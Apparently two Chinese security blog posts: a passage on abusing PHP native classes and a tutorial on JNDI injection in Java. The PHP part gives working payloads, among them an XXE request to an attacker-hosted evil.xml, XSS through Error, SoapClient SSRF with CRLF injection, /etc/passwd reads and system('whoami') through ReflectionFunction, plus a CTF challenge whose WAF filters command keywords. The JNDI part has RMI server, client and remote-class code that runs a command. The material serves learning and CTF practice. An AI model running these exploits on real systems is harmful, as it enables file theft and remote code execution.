<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;show.php?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;http:&#x2F;&#x2F;47.xxx.xxx.72&#x2F;evil.xml&amp;args[]&#x3D;2&amp;args[]&#x3D;true</span><br></pre></td></tr></table></figure>

<p>接收到数据</p>
<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c2d1bf9.jpg"></p>
<h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h1><p>__toString</p>
<h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c33a1fc.jpg"></p>
<h2 id="getmessage"><a href="#getmessage" class="headerlink" title="getmessage"></a>getmessage</h2><p>getMessage可直接传入eval执行命令，将转换成hex执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new Error(&#39;?&#39;);</span><br><span class="line">$c &#x3D; &quot;getMessage&quot;;</span><br><span class="line">$d &#x3D; &quot;eval(phpinfo())&quot;;</span><br><span class="line">eval(&quot;\$a-&gt;$c($d);&quot;);</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(hex2bin(<span class="string">&quot;6563686f20706928293b&quot;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> bin2hex(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;getMessage(<span class="keyword">eval</span>(hex2bin(<span class="string">&quot;706870696e666f28293b&quot;</span>)));</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//echo bin2hex(&#x27;phpinfo()&#x27;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>php存在内置类<code>SoapClient::__call</code>，存在可以触发<code>__call</code>方法时，可以进行ssrf</p>
<p>进行SSRF</p>
<p>配合CRLF</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://192.168.111.129:5555/path&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=something&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;not_exists_function();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<p>成功接收到报文</p>
<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c3b4772.jpg"></p>
<h1 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h1><p>遍历目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> <span class="keyword">extends</span> <span class="built_in">SplFileInfo</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> &#123;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> __construct ( <span class="keyword">string</span> <span class="variable">$path</span> )</span><br><span class="line">	<span class="keyword">public</span> current ( ) : <span class="built_in">DirectoryIterator</span></span><br><span class="line">	<span class="keyword">public</span> getATime ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getBasename ( <span class="keyword">string</span> <span class="variable">$suffix</span> = ? ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getCTime ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getExtension ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getFilename ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getGroup ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getInode ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getMTime ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getOwner ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getPath ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getPathname ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getPerms ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getSize ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getType ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> isDir ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isDot ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isExecutable ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isFile ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isLink ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isReadable ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isWritable ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> key ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> next ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> rewind ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> seek ( <span class="keyword">int</span> <span class="variable">$position</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> __toString ( ) : <span class="keyword">string</span>    <span class="comment">// 以字符串形式获取文件名</span></span><br><span class="line">	<span class="keyword">public</span> valid ( ) : <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h1><p>列出目录下文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>



<h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><p>读取文件，但是不添加其他参数只能读取第一行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure>

<p>可以通过遍历的方式读取所有内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h1><p>invokeArgs 可执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionFunction(<span class="string">&#x27;call_user_func&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionFunction(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d8ab33c9bd.jpg"></p>
<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/U4bbd76a58f51487b9f366ef386ad88504.jpg"></p>
<p>例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#x27;</span>,<span class="string">&quot;NepnEpneP&quot;</span>, <span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="variable">$__</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable">$_</span>(<span class="variable">$__</span>);&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    <span class="variable">$d</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;getMessage&quot;</span>;</span><br><span class="line">    <span class="variable">$d</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo \$a-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = new Error(&#x27;?&#x27;);</span></span><br><span class="line"><span class="comment">//$c = &quot;getMessage&quot;;</span></span><br><span class="line"><span class="comment">//$d = &quot;eval(phpinfo())&quot;;</span></span><br><span class="line"><span class="comment">//eval(&quot;\$a-&gt;$c($d);&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-17T05:24:56.000Z" title="2021-04-17T05:24:56.000Z">2021-04-17</time>发表</span><span class="level-item"><time dateTime="2021-04-17T05:26:57.965Z" title="2021-04-17T05:26:57.965Z">2021-04-17</time>更新</span><span class="level-item">10 分钟读完 (大约1515个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/">JNDI注入</a></h1><div class="content"><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。JNDI本质上是一个接口，在这个接口下可以实现多种目录系统服务，如RMI、LDAP等，可以通过名称查询相关对象</p>
<p><img src="https://www.hualigs.cn/image/607a712f64075.jpg"></p>
<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI（Remote Method Invocation）  即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message  Protocol，Java远程消息交换协议）以及CORBA。</p>
<p>相当于跨越jvm，调用一个远程方法。RMI是一种行为，即Java远程方法调用</p>
<h2 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h2><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p>
<p>本质上是一个协议，用于Java RMI过程，功能上相当于web访问中的http协议，只有通过使用该协议才能实现RMI远程方法调用</p>
<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。本质上相当于一个数据库，</p>
<h1 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h1><p>JNDI支持多种服务类型，当服务类型为RMI协议时，如果从RMI注册服务中lookup的对象类型为Reference类型或其子类时会导致远程代码执行。</p>
<p>因为Reference类提供了两个重要属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.className</span><br><span class="line">远程调用引用的类名</span><br><span class="line"></span><br><span class="line">2.codebase url</span><br><span class="line">决定在进行rmi远程调用时对象的位置，codebase url支持http协议，当通过lookup寻找的远程调用类在RMI服务器的CLASSPATH不存在时就会从指定的codebase url进行类的加载，如果两者都没有，远程调用失败</span><br></pre></td></tr></table></figure>



<p><strong>JNDI RCE漏洞产生原因</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在lookup的时候，会从RMI注册中心下载数据，由于服务名称和对象或命名引用相关联，只要在Registrations注册中心注册一个命名引用，即Reference，它具有三个参数，className、factory、classFactoryLocation。ookup它并下载到本地后，会使用Reference的classFactoryLocation指定的地址去下载className指定class文件，接着加载并实例化，这样就会远程调用类的构造方法，如果把恶意代码放在远程调用类的构造方法中，就可以触发RCE。</span><br></pre></td></tr></table></figure>

<h1 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h1><p>适用版本：小于JDK 6u132<code>, </code>JDK 7u122<code>, </code>JDK 8u113（原因是Java提升了JNDI 限制了<code>Naming/Directory</code>服务中<code>JNDI Reference</code>远程加载<code>Object Factory</code>类的特性。系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为<code>false</code>，即默认不允许从远程的<code>Codebase</code>加载<code>Reference</code>工厂类。）</p>
<p><strong>测试jdk版本 8u101</strong></p>
<p>CIENT.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">&quot;rmi://127.0.0.1:1099/aa&quot;</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SERVER.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/aa&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> ExecTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>把编译好的ExecTest.class文件放到web目录下</p>
<p><img src="https://www.hualigs.cn/image/607a712f07b8b.jpg"></p>
<p>启用web服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 -m http.server 8081</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607a712f0c50e.jpg"></p>
<p>在IDEA里执行SERVER和CLIENT，成功弹出计算器</p>
<p><img src="https://www.hualigs.cn/image/607a71313dd35.jpg"></p>
<h1 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h1><p>除了RMI服务外，JNDI还可以对接LDAP服务，只需要把lookup的地址改成<code>ldap://</code>即可，同样可以从攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p>
<p>适用版本</p>
<p>小于JDK 11.0.1、8u191、7u201、6u211（之后com.sun.jndi.ldap.object.trustURLCodebase属性值被调整为false）</p>
<p>这里使用工具来搭建ldap服务端 <a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<p>安装过程</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/14373826.html">https://www.cnblogs.com/cute-puli/p/14373826.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43968080/article/details/105586109">https://blog.csdn.net/qq_43968080/article/details/105586109</a></p>
